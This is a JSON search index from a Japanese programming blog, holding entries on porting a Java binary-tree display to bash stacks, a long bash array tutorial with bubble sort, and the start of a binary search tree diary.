[{"content":"9月29日 今日はバイナリサーチでツリーの中身を表示するメソッドを作成します。\nこんな感じでルートノードから下に向かってツリーの中身を出力します。\n...................................................... 50 25 75 12 37 -- 87 -- -- 30 43 -- -- -- 93 -- -- -- -- -- 33 -- -- -- -- -- -- -- -- -- 97 ...................................................... javaのプログラムは以下の通り\nStackを利用しています。\nbashにはStackがないのでメソッドを自作する必要がありそう\nStackも配列の操作なのでbashの配列操作を使ってメソッドを作成します。\n配列操作の基本については鈴木維一郎先生が作成したページを参考にしてください。\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\npublic void displayTree() { Stack globalStack = new Stack(); globalStack.push(root); int nBlanks = 32; boolean isRowEmpty = false; System.out.println( \u0026#34;......................................................\u0026#34;); while(isRowEmpty==false) { Stack localStack = new Stack(); isRowEmpty = true; for(int j=0; j\u0026lt;nBlanks; j++) System.out.print(\u0026#39; \u0026#39;); while(globalStack.isEmpty()==false) { Node temp = (Node)globalStack.pop(); if(temp != null) { System.out.print(temp.iData); localStack.push(temp.leftChild); localStack.push(temp.rightChild); if(temp.leftChild != null || temp.rightChild != null) isRowEmpty = false; } else { System.out.print(\u0026#34;--\u0026#34;); localStack.push(null); localStack.push(null); } for(int j=0; j\u0026lt;nBlanks*2-2; j++) System.out.print(\u0026#39; \u0026#39;); } // end while globalStack not empty System.out.println(); nBlanks /= 2; while(localStack.isEmpty()==false) globalStack.push( localStack.pop() ); } // end while isRowEmpty is false System.out.println( \u0026#34;......................................................\u0026#34;); } // end displayTree() // ------------------------------------------------------------- } // end class Tree スタックは後入れ先出しです。\npushで配列の後ろに要素を追加し、popで配列の一番後ろに入れた要素を取り出します。\nisEmptyという配列が空になったかを判定するメソッドも必要です。\npopで最後の配列要素をechoし、unsetで最後の配列要素を削除しようとしたのですが、\ncurrent=$(localStack.pop)という形で呼び出すと、サブシェルで呼び出すのでechoで最後の要素の内容は受け取れるのですが、unsetの結果が反映されませんでした。\nしょうがないので最後の配列要素をechoするpeekメソッドを作り、popは、unsetだけする動作に変更しました。\nfunction Stack_global.push() { Stack_global+=($1) } function Stack_global.pop() { if [ ${#Stack_global[*]} == 0 ];then echo \u0026#34;null\u0026#34;; return; fi local el=${Stack_global[${#Stack_global[*]}-1]} po=$((${#Stack_global[*]}-1)) unset Stack_global[$po] } function Stack_global.peek() { if [ ${#Stack_global[*]} == 0 ];then echo \u0026#34;null\u0026#34;; return; fi local el=${Stack_global[${#Stack_global[*]}-1]} po=$((${#Stack_global[*]}-1)) echo $el } function Stack_global.isEmpty() { if [ ${#Stack_global[*]} == 0 ];then echo \u0026#34;true\u0026#34;; else echo \u0026#34;false\u0026#34; fi } bashのプログラムは以下の形になります。\npublic void displayTree() { Stack globalStack = new Stack(); globalStack.push(root); int nBlanks = 32; boolean isRowEmpty = false; System.out.println( \u0026#34;......................................................\u0026#34;); while(isRowEmpty==false) { Stack localStack = new Stack(); isRowEmpty = true; for(int j=0; j\u0026lt;nBlanks; j++) System.out.print(\u0026#39; \u0026#39;); while(globalStack.isEmpty()==false) { Node temp = (Node)globalStack.pop(); if(temp != null) { System.out.print(temp.iData); localStack.push(temp.leftChild); localStack.push(temp.rightChild); if(temp.leftChild != null || temp.rightChild != null) isRowEmpty = false; } else { System.out.print(\u0026#34;--\u0026#34;); localStack.push(null); localStack.push(null); } for(int j=0; j\u0026lt;nBlanks*2-2; j++) System.out.print(\u0026#39; \u0026#39;); } // end while globalStack not empty System.out.println(); nBlanks /= 2; while(localStack.isEmpty()==false) globalStack.push( localStack.pop() ); } // end while isRowEmpty is false System.out.println( \u0026#34;......................................................\u0026#34;); } // end displayTree() // ------------------------------------------------------------- } // end class Tree Stackをglobal,localの２つを使っています。 push,pop,isEmpty,peekのメソッドをそれぞれ個別に作成しましたが、evalで１つにまとめた方が良いかもしれません。\n","date":"2022-09-29T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-29-01-ani/path_hu71550af48fd719c5bc16d756459bb446_156863_200x0_resize_box_3.png","permalink":"https://suzukiiichiro.github.io/posts/2022-09-29-01-ani/","title":"アルゴリズム日記 2022/09/29"},{"content":"Bashスクリプト（シェルスクリプト） は５０年以上も前からUNIXプログラミングのエッセンスとして君臨し、現在もLinuxのコマンドの殆どを構築しています。\nこうしたShellと言われるものはいくつか存在します。\nBourne Shell\nBourne Again Shell\nC Shell\nKorn Shell\nTC Shell\nBourne Again Shell ( BASH ) は、多くのLinuxディストリビューションのデフォルトシェルです。\n強力なコマンド編集機能\n無制限のイベント履歴\nエイリアスの導入\n無制限のサイズの配列\nBashは、強力な編集機能や変更機能など、多くの高度な機能があり、信じられないほどユーザー フレンドリーになっています。\n＜＜ばっさり省略＞＞\nこうしたBashスクリプトでアルゴリズムを習得するシリーズを始めます。\nまずは、Bashスクリプトの初歩、そしてデータ構造について、その後、ソートアルゴリズムやツリー、グラフなどへ進みます。\nこのページではBashスクリプトの配列について、重点的に習得します。\nBashスクリプティング Bashスクリプトを作成するには、テキストエディターを開き、冒頭１行目に「/usr/bin/bash」のPATHを 「#!」で参照します。この１行目を she-Bang（シェバン）といいます。\nシェバンは１行目になければなりません。\n２行目は空行である必要があります。\n３行目に「Hello, world!」を出力するスクリプトを記述します。\n#!/usr/bin/bash echo \u0026#34;Hello, world!\u0026#34; ; テキストエディタを保存しファイル名を「hello.sh」としてファイルを閉じます。\nコンソール画面でhello.shを確認したら、bashコマンドで、先ほど作成したファイルを実行します。\nlocal: $ bash hello.sh Hello, world! local: $ Bash スクリプトで変数を割り当てるのはとてもかんたんです。\nほかのプログラム言語にあるデータ型は不要です。\n変数に代入される任意の文字、単語、数字は、Bashによって自動で判断され処理します。\nコメント行は 「#」を行頭に挿入すると、「#」以降の文字列はコメントとして扱われます。\n複数行のコメントは「 :\u0026rsquo;」で開始し、「\u0026rsquo;」で終わります。\n#!/usr/bin/bash # 変数への代入 :\u0026#39; ここのブロックはコメントです 変数名 = [値] \u0026#39; var=\u0026#34;Hello, world!\u0026#34;; echo \u0026#34;$var\u0026#34;; 実行結果は以下のとおりです。\nlocal: $ bash comment.sh Hello, world! local: $ 一つの変数は、一つの値を保持することができます。\n同じデータ型の複数の値を保持する場合は、配列を使用します。\n配列は、インデックス番号で識別される要素のコレクションです。\nデータ構造の実装に関しては、配列が不可欠です。\n配列とは 一つの変数は、一つの値を保持することができます。\n同じデータ型の複数の値を保持する場合は、配列を使用します。\n配列は、インデックス番号で識別される要素のコレクションです。\nデータ構造の実装に関しては、配列が不可欠です。\n実際の例で配列を理解します。\n以下の電話連絡帳は、人の名前や連絡先電話番号が、配列(Array)の要素(Elements)となります。人の名前や連絡先電話番号の追加や削除といった、配列の要素を操作することが簡単にできます。\n電話番号 配列は主にデータ構造の実装に使用します。\n複数の変数を格納できる変数を「配列(Array)」と呼びます。\n配列(Array)は複数の要素(Elements)で構成されています。\n配列に複数の変数を割り当てる場合、構成される要素数の制限はありません。\n配列要素は通常ゼロから始まり、「添え字」といわれるインデックス番号によって参照します。\n以下の画像は、１０個の要素(Elements)で構成され、配列の長さは１０です。\n最初の要素番号は０から始まり、最後の要素番号は９となります。\nこの要素番号をインデックスと言い、要素番号を「添え字」と言います。\n配列 ヒント 配列を使用すると、複数の変数を一度に定義できます。これはプログラミングで同じ変数の型で同じ構造の変数を割り当てる効率的な方法です。 配列の応用 配列は非常に強力なユーティリティであり、多くの科学計算で使用できます。\n配列は、同じ名前の複数の変数を管理するために使用されます。 配列はベクトルで使用できます。ベクトルは通常、機械学習で広く使用される 1 次元配列です。 配列はスタックの実装にも使用され、スタックは実際の物理オブジェクトの山のように動作します。 配列は、キュー、デキュー、およびハッシュ テーブルにも実装されます。 要素の長方形配列である行列も、配列を使用して実装されます。 多くのプログラムのグラフは、配列の実装でもあるリストを使用して描画されます。 CPU スケジューリング アルゴリズムや並べ替えアルゴリズムなどの多くのアルゴリズムは、配列を使用して実装されます。 配列は、プログラム内の動的メモリ割り当てでも使用されます。 配列は音声処理でも使用されます。 ノイズ除去フィルターも配列を使用しています。 上記の配列の実装は、配列データ型の可能性を明確に示しています。\nBashにおける配列の構文 Bashはインデックス付き配列（１次元配列）と、連想配列の療法をサポートしています。以下は、Bashで配列を割り当てる典型的な構文です。\n#name_of_array[添え字]=値 name_of_array[subscript]=value; 配列は要素の集まりであるため、配列内の要素番号は添え字（そえじ）と呼ばれます。\n添え字は、配列内の要素の位置を示します。\n配列内の５番目の要素に値を代入または変更するには、以下のようにします。\n５番目なのにname_of_array[4]となる理由は、インデックスが０から始まっているからです。\n# 0,1,2,3,4,5 name_of_array[4]=value; declare キーワードで配列を宣言すると、まちがいの少ないソースコードを書くことができます。\n# 変数(name_of_array) を 配列(-a)で宣言(declare)する。 declare -a name_of_array; 複数の値を代入する場合は以下の構文となります。\n# 変数(name_of_array) を 配列(-a)で宣言(declare)する。 declare -a name_of_array; name_of_array=(value1 value2 …); 一行にまとめて書くこともできます。\n# 変数(name_of_array) を 配列(-a)で宣言(declare)する。 declare -a name_of_array=(value1 value2 …); Bashでの配列の割り当て Bash スクリプトの配列は、さまざまな方法で割り当てることができます。\nBash スクリプトで配列を割り当てる最も簡単な方法は、丸括弧内にスペースを含む一連の値を、半角スペース区切りで値を代入することです。\necho行に見られる「@」は配列内のすべての要素を出力する場合に使います。\n#!/usr/bin/bash declare -a my_array=(1 2 3 4); echo ${my_array[@]}; bash-5.1$ bash number.sh 1 2 3 4 5 bash-5.1$ Bash スクリプトの配列には、さまざまなデータ型の要素を代入することができます。\nデータ型が文字列の要素を配列に割り当てるには以下のようにします。\n#!/usr/bin/bash declare -a my_array=(jan feb mar apr); echo ${my_array[@]}; bash-5.1$ bash month.sh jan feb mar apr bash-5.1$ 配列に、要素を割り当てるには、角括弧 [要素番号]で要素番号を指定して、値を割り当てます。\ndeclare -a my_array=([0]=\u0026#34;jan\u0026#34; [1]=\u0026#34;feb\u0026#34; [2]=\u0026#34;mar\u0026#34; [3]=\u0026#34;apr\u0026#34;); echo ${my_array[@]}; bash-5.1$ bash month2.sh jan feb mar apr bash-5.1$ 要素を一つずつ書くと以下の通りとなります。\nmy_array[0]=\u0026#34;jan\u0026#34;; my_array[1]=\u0026#34;feb\u0026#34;; 配列は、「declare」 キーワードで宣言することが理想です。\ndeclareのオプション 「-a」 と 「-A」 はそれぞれ、配列と連想配列を宣言するために区別され使用されます。\n一般的な配列\ndeclare -a my_array; #配列 my_array[0]=\u0026#34;jan\u0026#34;; my_array[1]=\u0026#34;feb\u0026#34;; 連想配列\ndeclare -A my_array; #連想配列 my_array[first]=\u0026#34;jan\u0026#34;; my_array[second]=\u0026#34;feb\u0026#34;; 連想配列は以下のように入力することもできます。\ndeclare -A my_array=([first]=\u0026#34;jan\u0026#34; [second]=\u0026#34;feb\u0026#34; [third]=\u0026#34;mar\u0026#34; [fourth]=\u0026#34;apr\u0026#34;); 以下のスクリプトは、１から６までの数値を配列に代入します。\ndeclare -a my_array=$(seq 1 6); echo ${my_array[@]}; 実行結果は以下のとおりです。\nbash-5.1$ bash seq.sh 1 2 3 4 5 6 bash-5.1$ ループによる配列の代入 配列は、ループを介して割り当てることもできます。\n以下は、month_arrayの内容をmy_arrayへコピーして出力しています。\nこのブロックは少し難しいかもしれません。\nBash固有の知識も必要なこともあり、アルゴリズムの習得には特に必要なことではないので、読み飛ばしていただいても結構です。\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); declare -i number=0; # 変数は数値型 declare -a my_array; # 変数は配列型 while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) echo ${my_array[@]}; 文字列からの配列の代入 前の項のサンプルをもう少し簡単に配列を割り当てることができます。\n修正前の前項のサンプル\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); declare -a my_array; # 変数は配列型 declare -i number=0; # 変数は数値型 while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) # 出力 echo ${my_array[@]}; 修正したスクリプト。while read がまるごと不要となっていますね。\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); declare -a my_array=(${month_array// / }); このブロックはまるごとコメントアウト : \u0026#39; declare -i number=0; while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) \u0026#39; # 出力 echo ${my_array[@]}; 「- ハイフン」で区切りたい場合は以下のとおりです。\ndeclare -a my_array=(${month_array//-/ }); Bash ２種類の配列 配列を使用するには、多くの方法とアプローチがあります。Bashには２種類の配列があります。\nインデックス付き配列（一般的な配列） 連想配列 インデックス付き配列 インデックス付き配列は、0から始まるインデックス番号で参照される要素を格納する配列の基本的な形式です。Bash スクリプトでのインデックス付き配列の例を以下に示します。\ndeclare -a my_array=(a b c d); 前述の通り、配列はdeclareキーワードを使って宣言すると、間違いな少なくなります。\n「my_array」は変数です。\n「a、b、c、d」 は配列の要素です。\n配列の長さは４です。\n「a」の要素番号は０です。\n要素番号は０から始まるので「d」の要素番号は３となります。\n以下の例では、０番目の要素に\u0026quot;First Item\u0026quot;、１番目の要素に\u0026quot;Second Item\u0026quot;を代入しています。\ndeclare -a my_array; my_array[0]=\u0026#34;First Item\u0026#34;; my_array[1]=\u0026#34;Second Item\u0026#34;; 連想配列 連想配列は、文字列をインデックスとして使用する配列です。つまり、連想配列の配列インデックスは名前付きの形式です。連想配列は、「declare」 キーワードを使用して Bash で宣言されます。\n#!/usr/bin/bash declare -A my_array my_array[one]=\u0026#34;First Item\u0026#34;; my_array[two]=\u0026#34;Second Item\u0026#34;; echo \u0026#34;${my_array[@]}\u0026#34;; 実行結果は以下の通りです。\nbash-5.1$ bash associativeArrays.sh First Item Second Item bash-5.1$ 連想配列の宣言には、任意の文字列、または文字セットが使用されます。\n# 連想配列として宣言 declare -A my_array[\u0026#34;this is a string\u0026#34;]=\u0026#34;Hello Linux\u0026#34;; echo \u0026#34;${my_array[@]}\u0026#34;; 実行結果は以下の通りです。\nbash-5.1$ associativeArray2.sh Hello Linux bash-5.1$ 上記のように、配列インデックス内の文字列にはスペースが含まれていることに注意することが重要です。\n連想配列を初期化する別の方法を以下に示します。\ndeclare -A my_array=([month1]=jan [month2]=feb [month3]=mar); echo \u0026#34;${my_array[@]}\u0026#34;; bash-5.1$ bash associativeArrays3.sh mar feb jan bash-5.1$ Bashでの配列へのアクセス 他のすべてのプログラミング言語と同様に、Bash の配列もインデックス番号を介してアクセスされます。例を通してそれを理解しましょう：\ndeclare -a my_array=(jan feb mar apr); echo ${my_array[1]}; echoは、コマンドラインインターフェイスに標準出力を出力するBashコマンドです。\n上記の例では、echoコマンドは、配列my_arrayの最初のインデックスに項目を出力しています。\nfebのインデックス番号は１であるため、標準出力にfebが出力されます。\nbash-5.1$ bash arraysAccess.sh feb bash-5.1$ 配列のすべての要素の表示 配列のすべての要素を表示するには、「@」を使います。\necho ${my_array[@]}; すべての要素を単一引用符文字列として表示するには、「＊」を使います。\necho ${my_array[*]}; 配列の特定の要素の表示 配列の任意の要素を表示するには以下のようにします。\n配列の3番目の要素を出力する\n# ０から始まる要素番号の３番目は２です。 echo ${my_array[2]}; 配列の最後の要素を添え字拡張メソッドで出力することができます。\necho ${my_array[@]: -1}; 添え字構文を使用して最後の要素を出力するには、次を使用します。\necho ${my_array[-1]}; 要素の範囲を出力するには、以下の構文を使用します。\necho ${my_array[@]:x:y}; ここで 、xは最初のインデックス番号で、yは最後のインデックス番号です。\n例えば、インデックス0から2までの要素を表示するには、次を使用します。\necho ${my_array[@]:1:3}; ここまでのまとめを以下にまとめました。\n#!/usr/bin/bash declare -a my_array=( jan feb mar apr ); echo \u0026#34;配列のすべての要素:\u0026#34; ${my_array[@]}; echo \u0026#34;配列の 2 番目の要素:\u0026#34; ${my_array[1]}; #インデックスは0から始まる echo \u0026#34;部分文字列展開による配列の最後の要素:\u0026#34; ${my_array[@]: -1}; echo \u0026#34;添字による配列の最後の要素:\u0026#34; ${my_array[-1]}; echo \u0026#34;インデックス 1 から 3 までの要素:\u0026#34; ${my_array[@]:1:3}; 実行結果は以下のとおりです。\nbash-5.1$ bash arraysAccess.sh 配列のすべての要素: jan feb mar apr 配列の 2 番目の要素: feb 部分文字列展開による配列の最後の要素: apr 添字による配列の最後の要素: apr インデックス 1 から 3 までの要素: feb mar apr bash-5.1$ 配列の初期化されたインデックスへのアクセス 配列のインデックスは、プログラミング中の重要な要素です。\nインデックス番号を取得するには、次を使用します。\n#!/usr/bin/bash declare -a my_array; my_array[3]=\u0026#34;jan\u0026#34;; my_array[5]=\u0026#34;feb\u0026#34;; my_array[9]=\u0026#34;mar\u0026#34;; my_array[12]=\u0026#34;mar\u0026#34;; echo \u0026#34;インデックスのリスト:\u0026#34; ${!my_array[@]}; bash-5.1$ bash indexAccess.sh インデックスのリスト: 3 5 9 12 bash-5.1$ Bashでの配列の変更 要素の更新 配列内の特定の要素を更新するには、次の構文に従います。\nmy_array [ \u0026lt; index_number \u0026gt; ] =値\n#!/usr/bin/bash declare -a my_array; my_array=(jan feb mar apr); echo \u0026#34;現在の要素 :\u0026#34; ${my_array[@]}; my_array[2]=\u0026#34;may\u0026#34;; echo \u0026#34;更新した要素:\u0026#34; ${my_array[@]} 実行結果は以下のとおりです。\nbash-5.1$ bash replaceArrays.sh 現在の要素 : jan feb mar apr 更新した要素: jan feb may apr bash-5.1$ 上記の例では、2番目のインデックスの要素である \u0026ldquo;mar\u0026quot;が\u0026quot;may\u0026quot;に置き換えられています。\n要素の追加 my_array+=(jun Jul); my_array=(\u0026#39;dec\u0026#39; ${my_array[@]}); #!/usr/bin/bash declare -a my_array=(jan feb mar apr); my_array+=(jun jul); echo \u0026#34;配列の末尾に要素を追加: \u0026#34;${my_array[@]}; my_array=(\u0026#34;dec\u0026#34; ${my_array[@]}); echo \u0026#34;配列の先頭に要素を追加: \u0026#34;${my_array[@]}; bash-5.1$ bash addArrays.sh 配列の末尾に要素を追加:jan feb mar apr jun jul 配列の先頭に要素を追加:dec jan feb mar apr jun jul bash-5.1$ 要素の挿入 特定のインデックスに要素を挿入するには、次のようにします。\n#!/usr/bin/bash declare -a my_array=(jan feb mar apr); echo ${my_array[@]}; i=2; my_array=(\u0026#34;${my_array[@]:0:$i}\u0026#34; \u0026#34;aug\u0026#34; \u0026#34;${my_array[@]:$i}\u0026#34;); echo ${my_array[@]}; 上記の例では、配列(my_array)の2番目のインデックスに要素augを挿入し、次の要素を次のインデックスにシフトしています。\n要素marとaprは、それぞれインデックス３と４にシフトされます。\n実行結果は以下のとおりです。\nbash-5.1$ bash insertArrays.sh jan feb mar apr jan feb aug mar apr bash-5.1$ 要素の削除 Bash 配列では、「unset」コマンドを使用して要素を削除できます。\n配列のすべての要素を削除するには、次のようにします。\ndeclare -a my_array=(jan feb mar apr) unset my_array # 配列を削除 「unset」は、宣言された変数を削除するための組み込みコマンドです。\n配列内の特定の要素の設定を解除するには、次のようにします。\n#!/usr/bin/bash declare -a my_array=(jan feb mar apr); unset my_array[2]; #３番目の要素を削除 echo \u0026#34;3番目の要素を削除したあとの配列:\u0026#34;${my_array[@]} 実行結果は以下のとおりです。\nbash-5.1$ bash deleteArrays.sh 3番目の要素を削除したあとの配列:jan feb apr bash-5.1$ パターンコマンドで削除する patternコマンドを使用して要素を削除することもできます。\n# ju で始まる要素を配列から削除します。 my_pattern(${my_array[@]/ju*/}) 次のスクリプトは「ju」で始まる要素を配列から削除します。\n#!/usr/bin/bash declare -a my_array=(jan feb mar apr jun jul); echo \u0026#34;現在の配列\u0026#34; ${my_array[@]}; declare -a my_pattern=(${my_array[@]/ju*/}); echo \u0026#34;juから始まる要素は配列から削除しました:\u0026#34; ${my_pattern[@]}; 実行結果は以下のとおりです。\nbash-5.1$ bash test 現在の配列 jan feb mar apr jun jul juから始まる要素は配列から削除しました: jan feb mar apr bash-5.1$ 配列のマージ 2 つの配列をマージするには、次を使用します。\n# 二つの配列をマージ（結合）します my_array=(${my_array1[@]} ${my_array2[@]}); #!/usr/bin/bash declare -a my_array1=(jan feb mar apr); echo \u0026#34;my_array1: \u0026#34; ${my_array1[@]}; declare -a my_array2=(may jun jul aug); echo \u0026#34;my_array2: \u0026#34; ${my_array2[@]}; #マージ declare -a my_array=(${my_array1[@]} ${my_array2[@]}); echo \u0026#34;マージした配列:\u0026#34;${my_array[@]}; 実行結果は以下のとおりです。\nbash-5.1$ bash mergeArrays.sh my_array1: jan feb mar apr my_array2: may jun jul aug マージした配列:jan feb mar apr may jun jul aug bash-5.1$ 注意 うーん、マージというか結合ですね。 配列要素のギャップの削除 #!/usr/bin/bash declare -a my_array1=(jan feb mar apr) echo \u0026#34;不要な要素を含む配列:\u0026#34; ${my_array1[@]} my_array2=(${my_array1[@]}) echo \u0026#34;不要な要素を削除した配列:\u0026#34; ${my_array2[@]} 実行結果は以下のとおりです。\nbash-5.1$ bash gapArrays.sh 不要な要素を含む配列: jan feb mar apr 不要な要素を削除した配列: jan feb mar apr bash-5.1$ 注意 my_array[@]で出力する段階で、余分なスペースが連続していたとしても除去され空白は一つになります。 Bashで配列の長さを求める 配列の長さを求めるには「#」を使います。\ndeclare -a my_array=(jan feb mar apr); echo ${#my_array[@]}; 実行結果は以下のとおりです。\nbash-5.1$ bash countArrays.sh 4 bash-5.1$ Bashでループを使用して配列を反復処理する 配列にアクセスするにはさまざまな方法があります。\nすべての要素を入力して明示的にアクセスするか、配列の要素をループすることができます。\n一般的なforループで配列を出力\n#!/usr/bin/bash declare -a my_array=( e1 e2 e3 e4 e5 e6 ); for i in ${my_array[@]};do echo $i; done 実行結果は以下のとおりです。\nbash-5.1$ bash forArrays.sh e1 e2 e3 e4 e5 e6 bash-5.1$ CやJavaのような書き方もできます。\n「-lt」の代わりに、 小なり記号 「\u0026lt;」 も使用できます。\n上記の ループは次のようにも記述できます。\n#!/usr/bin/bash echo \u0026#34;スマートな書き方\u0026#34;; for((i=0;i\u0026lt;${#my_array[@]};i++));do echo ${my_array[i]}; done forに限定ですが、実はdoやdoneを中括弧に置き換えることもできます。\n#!/usr/bin/bash echo \u0026#34;もっとスマートな書き方\u0026#34;; for((i=0;i\u0026lt;${#my_array[@]};i++)){ echo ${my_array[i]}; } whileループも同様です。\n「-lt」の代わりに、 小なり記号 「\u0026lt;」 も使用できます。\n#!/usr/bin/bash declare -a my_array=( e1 e2 e3 e4 e5 e6 ); declare -i i=0; echo \u0026#34;一般的な書き方\u0026#34;; while [ $i -lt ${#my_array[@]} ];do echo my_array[$i]; i=$((i+1)); done echo \u0026#34;スマートな書き方\u0026#34;; i=0; while(($i\u0026lt;${#my_array[@]}));do echo my_array[$i]; ((i++)); # インクリメント done Bashの多次元配列 多次元配列は、Bashプログラミング言語の正式な部分ではありませんが、多次元配列をサポートしています。多次元配列は、forループを使用して簡単にシミュレートできます。\n#!/usr/bin/bash declare -a my_array echo \u0026#34;行数を入力してください。\u0026#34; read rows echo \u0026#34;列数を入力してください。\u0026#34; read cols for((x=0;x\u0026lt;rows;x++)){ for((y=0;y\u0026lt;cols;y++)){ my_array[${x},${y}]=$RANDOM; #乱数の割当 } } for((i=0;i\u0026lt;rows;i++)){ for((y=0;y\u0026lt;cols;y++)){ echo -ne \u0026#34;${my_array[${x},${y}]}\\t\u0026#34;; } echo; } 実行結果は以下のとおりです。\nbash-5.1$ bash multidimensionalArrays.sh 行数を入力してください。 5 列数を入力してください。 5 30450 17441 17878 21194 17382 30450 17441 17878 21194 17382 30450 17441 17878 21194 17382 30450 17441 17878 21194 17382 30450 17441 17878 21194 17382 bash-5.1$ 上記のコードは、ユーザーからの入力として行と列を受け取り、0～32767の疑似乱数を生成します 。\nBashでのバブルソート ソートはデータの管理に使用され、検索アルゴリズムなどのアルゴリズム機能をより効率的にするプログラミングのよく知られた手法のひとつです。\nバブルソーティングは、シンキングソーティングとも呼ばれ、わかりやすいソーティング手法の1つです。\nバブルソートは、提供された配列リストをステップ実行し、配列要素を比較し、一時変数の要素を交換し、配列が整うまでタスクを繰り返します。\n以下に、bashでのバブルソートの例を示します。\n#! /bin/bash declare -a my_array=(2 3 1 5 4); echo \u0026#34;未ソートの配列 :\u0026#34; ${my_array[*]}; for ((x=0; x\u0026lt;5; x++)){ for ((y=0; y\u0026lt;5-i-1; y++)){ if [ ${my_array[y]} -gt ${my_array[$((y+1))]} ]; then temp=${my_array[y]}; my_array[$y]=${my_array[$((y+1))]}; my_array[$((y+1))]=$temp; fi } } echo \u0026#34;ソート済みの配列\u0026#34; ${my_array[*]}; bash-5.1$ bash bubbleSort.sh 未ソートの配列 : 2 3 1 5 4 ソート済みの配列 1 2 3 4 5 bash-5.1$ ヒント ソートアルゴリズムについては、次回の「ざっくりわかるシェルスクリプト７」で詳しく説明します。 「ざっくり」シリーズのご紹介 【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-27T10:31:43+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/","title":"【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６"},{"content":"9月27日 アルゴリズムの勉強を始めました。\nまずは基礎から。\nバイナリサーチからスタートします。\nそれまでのものは鈴木先生が作成している以下のgitをご参照ください。\nhttps://github.com/suzukiiichiro/Algorithms-And-Data-Structures\nまず、バイナリサーチの挿入のメソッドを作成したいと思います。\nロジックは以下の通り\nバイナリサーチをするためにはソード済みであること必要なので、挿入時にrootノードの左側にrootノードより少ない値を、右側にrootノードより大きい値を置いていきます。各ノードは左右に最大２つのノードを持って枝分かれしていきます。それぞれのノードが左は自分より小さい値を右が自分より大きい値を置きます。\n・最初にルートを設定する（初回のinsertの時だけ動く）\n・ルートノードから値を比較しながら下のノードに移動していく\n・着目しているノードと目的の値を比較する。\n・目的の値 \u0026lt; 